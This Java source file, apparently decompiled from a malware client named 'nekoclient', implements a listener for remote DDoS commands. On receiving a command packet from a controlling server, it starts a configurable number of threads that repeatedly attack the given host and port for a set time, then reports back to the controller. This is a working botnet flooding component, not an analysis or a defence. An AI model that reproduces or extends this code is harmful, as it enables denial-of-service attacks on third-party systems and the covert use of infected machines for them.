package dev.neko.nekoclient.packet.listener.impl;

import dev.neko.nekoclient.Client;
import dev.neko.nekoclient.api.ddos.ThreadsUnit;
import dev.neko.nekoclient.api.ddos.impl.handler.MethodHandler;
import dev.neko.nekoclient.packet.impl.client.ActionResponsePacket;
import dev.neko.nekoclient.packet.impl.server.DDoSPacket;
import dev.neko.nekoclient.packet.listener.PacketListener;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class DDoSPacketListener implements PacketListener<DDoSPacket> {
   public void call(DDoSPacket packet, Client client, String id) throws IOException {
      int threads = packet.getThreads();
      if (Objects.equals(packet.getThreadsUnit(), ThreadsUnit.THREADS_PER_CORE)) {
         threads *= Runtime.getRuntime().availableProcessors();
      }

      ExecutorService executorService = Executors.newWorkStealingPool(threads);
      MethodHandler handler = packet.getMethod().createHandler();
      InetSocketAddress address = handler.transformAddress(new InetSocketAddress(packet.getHost(), packet.getPort()), packet.getHost());

      try {
         handler.init(packet.getProtocol(), address, packet.getHost(), packet.getOptions());
      } catch (IllegalArgumentException var10) {
         client.send(new ActionResponsePacket(packet.getNonce(), false));
         return;
      }

      Runnable runnable = () -> {
         while(!executorService.isShutdown() && !executorService.isTerminated()) {
            try {
               handler.run(packet.getProtocol(), address);
            } catch (Throwable var5x) {
            }
         }
      };
      Executors.newSingleThreadScheduledExecutor().schedule(() -> {
         executorService.shutdownNow();
         handler.cleanup();
      }, packet.getTime(), TimeUnit.SECONDS);

      for(int i = 0; i < threads; ++i) {
         executorService.execute(runnable);
      }

      client.send(new ActionResponsePacket(packet.getNonce(), true));
   }
}
